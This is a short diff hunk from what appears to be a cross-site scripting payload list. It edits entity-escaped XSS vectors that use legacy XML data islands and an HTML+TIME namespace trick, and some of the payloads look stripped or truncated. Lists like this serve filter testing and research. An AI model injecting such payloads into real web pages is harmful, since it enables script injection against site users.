@@ -148,7 +148,7 @@ exp/*&lt;A &gt;XSS&lt;/A&gt;
 
 &lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;![CDATA[&lt;IMG src=""&gt;]]&lt;/C&gt;&lt;/X&gt;&lt;/xml&gt;&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;
 
-&lt;XML ID="xss"&gt;&lt;I&gt;&lt;B&gt;&lt;IMG &gt;&gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;&lt;SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"&gt;&lt;/SPAN&gt;
+&lt;XML ID="xss"&gt;&lt;I&gt;&lt;B&gt;&lt;IMG src=""&gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;&lt;SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"&gt;&lt;/SPAN&gt;
 
 &lt;?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"&gt;&lt;?import namespace="t" implementation="#default#time2"&gt;&lt; attributeName="innerHTML" to="XSSdocument.vulnerable=true"&gt;
 
